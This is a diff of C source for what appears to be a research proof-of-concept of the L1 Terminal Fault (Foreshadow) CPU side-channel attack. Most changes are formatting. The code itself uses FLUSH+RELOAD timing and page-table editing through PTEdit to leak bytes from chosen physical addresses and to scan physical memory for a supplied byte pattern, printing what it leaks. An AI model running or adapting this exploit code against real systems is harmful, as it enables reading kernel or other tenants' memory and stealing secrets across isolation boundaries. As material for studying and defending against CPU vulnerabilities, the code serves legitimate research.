@@ -28,13 +28,11 @@
 uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
   flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
   asm_l1tf_leak_high_nibble(leak_addr, reload_buffer);
-  size_t high = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE,
-                       (void *)reload_buffer[0], THRESHOLD);
+  size_t high = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
 
   flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[1]);
   asm_l1tf_leak_low_nibble(leak_addr, reload_buffer);
-  size_t low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE,
-                      (void *)reload_buffer[1], THRESHOLD);
+  size_t low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[1], THRESHOLD);
 
   return ((high & 0x0f) << 4) | (low & 0x0f);
 }
@@ -43,8 +41,7 @@ uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
 // Only requires a single FLUSH+RELOAD of a single address (instead
 // of 32 or 256). Useful to quickly scan physical memory, assuming we know
 // that a certain byte appears.
-bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer,
-                uint8_t check) {
+bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer, uint8_t check) {
   clflush(reload_buffer[check]);
   mfence();
 
@@ -54,8 +51,7 @@ bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer,
   return time < THRESHOLD;
 }
 
-bool l1tf_check_4(void *leak_addr, full_reload_buffer_t reload_buffer,
-                  uint8_t check[4]) {
+bool l1tf_check_4(void *leak_addr, full_reload_buffer_t reload_buffer, uint8_t check[4]) {
   clflush(reload_buffer[check[3]]);
   mfence();
 
@@ -67,8 +63,8 @@ bool l1tf_check_4(void *leak_addr, full_reload_buffer_t reload_buffer,
 }
 
 leak_addr_t l1tf_leak_buffer_create() {
-  void *leak_ptr = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
-                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+  void *leak_ptr =
+      mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
   assert(leak_ptr != MAP_FAILED);
   assert(!mprotect(leak_ptr, PAGE_SIZE, PROT_NONE));
 
@@ -100,15 +96,13 @@ void l1tf_leak_buffer_free(leak_addr_t *leak) {
 void initialize_pteditor_lib() {
   fprintf(stderr, "Initializing PTEdit...\r");
   assert(!ptedit_init());
-  fprintf(stderr,
-          "Initialized PTEdit! Mapping physical memory to user space...\n");
+  fprintf(stderr, "Initialized PTEdit! Mapping physical memory to user space...\n");
   ptedit_use_implementation(PTEDIT_IMPL_USER);
 }
 
 reload_buffer_t *l1tf_reload_buffer_create() {
-  reload_buffer_t *reload_buffer =
-      mmap(NULL, sizeof(reload_buffer_t), PROT_WRITE | PROT_READ,
-           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+  reload_buffer_t *reload_buffer = mmap(NULL, sizeof(reload_buffer_t), PROT_WRITE | PROT_READ,
+                                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
   assert(reload_buffer != MAP_FAILED);
   return reload_buffer;
 }
@@ -148,17 +142,15 @@ mds_offenders_t detect_mds_bytes_in_page(void) {
 
   offenders.fd = open("bin/.mds.cache", O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);
   if (offenders.fd < 0) {
-    fprintf(
-        stderr,
-        "Failed to open the file bin/.mds.cache: %s. Continuing without the "
-        "cache\n",
-        strerror(errno));
-    offenders.ptr = mmap(NULL, offenders.mmap_size, PROT_WRITE | PROT_READ,
-                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    fprintf(stderr,
+            "Failed to open the file bin/.mds.cache: %s. Continuing without the "
+            "cache\n",
+            strerror(errno));
+    offenders.ptr =
+        mmap(NULL, offenders.mmap_size, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   } else {
     assert(!ftruncate(offenders.fd, offenders.mmap_size));
-    offenders.ptr = mmap(NULL, offenders.mmap_size, PROT_WRITE | PROT_READ,
-                         MAP_SHARED, offenders.fd, 0);
+    offenders.ptr = mmap(NULL, offenders.mmap_size, PROT_WRITE | PROT_READ, MAP_SHARED, offenders.fd, 0);
   }
   assert(offenders.ptr != MAP_FAILED);
 
@@ -172,9 +164,7 @@ mds_offenders_t detect_mds_bytes_in_page(void) {
     fprintf(stderr, "Loaded MDS offenders from cache!\n");
     return offenders;
   }
-  fprintf(
-      stderr,
-      "There is no MDS offender cache, building one (may take some time)...\n");
+  fprintf(stderr, "There is no MDS offender cache, building one (may take some time)...\n");
 
   reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();
 
@@ -278,8 +268,7 @@ void escape_ascii(char in, char out[3]) {
 void do_leak(const uintptr_t phys_addr, const size_t length) {
   initialize_pteditor_lib();
 
-  fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length,
-          (void *)phys_addr);
+  fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
 
   fprintf(stderr, "Request leak and reload buffers\n");
 
@@ -299,8 +288,7 @@ void do_leak(const uintptr_t phys_addr, const size_t length) {
   mds_offenders_t mds_offenders = detect_mds_bytes_in_page();
   printf("-> Amount of offending bytes: %ld\n", mds_offenders.amount);
 
-  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length,
-         phys_addr);
+  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
   size_t start = (phys_addr & 0xfff);
   assert(start + length < 0xfff);
 
@@ -344,10 +332,8 @@ void do_leak(const uintptr_t phys_addr, const size_t length) {
   ptedit_cleanup();
 }
 
-void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size,
-                                char needle[needle_size],
-                                full_reload_buffer_t reload_buffer,
-                                leak_addr_t leak) {
+void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size],
+                                full_reload_buffer_t reload_buffer, leak_addr_t leak) {
   assert(needle_size > 0);
   assert(needle_size < scan_opts.stride);
   assert(needle_size % 4 == 0);
@@ -356,11 +342,9 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size,
   reload_buffer_t nibble_reload_buffer = {0};
   size_t attempt = 1;
   while (true) {
-    for (uintptr_t ptr = scan_opts.start, i = 0; ptr < scan_opts.end;
-         ptr += scan_opts.stride, ++i) {
+    for (uintptr_t ptr = scan_opts.start, i = 0; ptr < scan_opts.end; ptr += scan_opts.stride, ++i) {
       if (i % 100000 == 0) {
-        fprintf(stderr, "run %ld: %.2f%%\r", attempt,
-                ((double)ptr / (double)scan_opts.end) * (double)100);
+        fprintf(stderr, "run %ld: %.2f%%\r", attempt, ((double)ptr / (double)scan_opts.end) * (double)100);
       }
       l1tf_leak_buffer_modify(&leak, (void *)ptr);
 
@@ -369,12 +353,10 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size,
         if (l1tf_check_4(leak_ptr, reload_buffer, (uint8_t *)needle)) {
           uint8_t leaked_data[32] = {0};
           for (size_t data_idx = 0; data_idx < 32; ++data_idx) {
-            leaked_data[data_idx] =
-                l1tf_full(&leak_ptr[data_idx], nibble_reload_buffer) & 0xff;
+            leaked_data[data_idx] = l1tf_full(&leak_ptr[data_idx], nibble_reload_buffer) & 0xff;
           }
           printf("\n%p\t", (void *)ptr);
-          for (size_t leaked_data_idx = 0; leaked_data_idx < 32;
-               ++leaked_data_idx) {
+          for (size_t leaked_data_idx = 0; leaked_data_idx < 32; ++leaked_data_idx) {
             printf("%.2x ", leaked_data[leaked_data_idx]);
           }
           printf("\n");
@@ -387,14 +369,12 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size,
   return NULL;
 }
 
-void do_scan(scan_opts_t scan_opts, size_t needle_size,
-             char needle[needle_size]) {
+void do_scan(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size]) {
   initialize_pteditor_lib();
   full_reload_buffer_t reload_buffer = {0};
   leak_addr_t leak = l1tf_leak_buffer_create();
 
-  void *phys_addrs = l1tf_scan_physical_memory(scan_opts, needle_size, needle,
-                                               reload_buffer, leak);
+  void *phys_addrs = l1tf_scan_physical_memory(scan_opts, needle_size, needle, reload_buffer, leak);
   if (phys_addrs) {
     printf("Found needle at %p\n", phys_addrs);
   } else {
@@ -481,8 +461,7 @@ int main_scan(const int argc, char *argv[argc]) {
     case 's':
       start_addr = strtoull(optarg, &tail, 16);
       if (tail == optarg) {
-        fprintf(stderr,
-                "Failed to parse physical start address as hexadecimal\n");
+        fprintf(stderr, "Failed to parse physical start address as hexadecimal\n");
         exit(1);
       }
       break;
@@ -508,20 +487,19 @@ int main_scan(const int argc, char *argv[argc]) {
 
   char needle[128];
   ssize_t needle_size = read(STDIN_FILENO, needle, 128);
+  printf("Needle size: %d\n", needle_size);
 
-  if (start_addr == (uintptr_t)-1 || length == (uintptr_t)-1 ||
-      needle_size <= 0) {
-    fprintf(
-        stderr,
-        "Required arguments of scan subcommand\n"
-        "\t-%c, --%s\thexadecimal physcial address where you "
-        "want to start scanning from\n"
-        "\t-%c, --%s\tthe length of the range that you want to scan in "
-        "bytes\n"
-        "\t-%c, --%s\tthe stride between every check, defaults to one page\n"
-        "Make sure to pass the needle in via stdin\n",
-        options[0].val, options[0].name, options[1].val, options[1].name,
-        options[2].val, options[2].name);
+  if (start_addr == (uintptr_t)-1 || length == (uintptr_t)-1 || needle_size <= 0) {
+    fprintf(stderr,
+            "Required arguments of scan subcommand\n"
+            "\t-%c, --%s\thexadecimal physcial address where you "
+            "want to start scanning from\n"
+            "\t-%c, --%s\tthe length of the range that you want to scan in "
+            "bytes\n"
+            "\t-%c, --%s\tthe stride between every check, defaults to one page\n"
+            "Make sure to pass the needle in via stdin\n",
+            options[0].val, options[0].name, options[1].val, options[1].name, options[2].val,
+            options[2].name);
     exit(1);
   }
 
@@ -544,9 +522,9 @@ int main(int argc, char *argv[argc]) {
   assert(argc > 0);
 
   if (argc >= 2) {
-    if (!strncmp("leak", argv[1], 5)) {
+    if (!strcmp("leak", argv[1])) {
       return main_leak(argc, argv);
-    } else if (!strncmp("scan", argv[1], 5)) {
+    } else if (!strcmp("scan", argv[1])) {
       return main_scan(argc, argv);
     }
   }
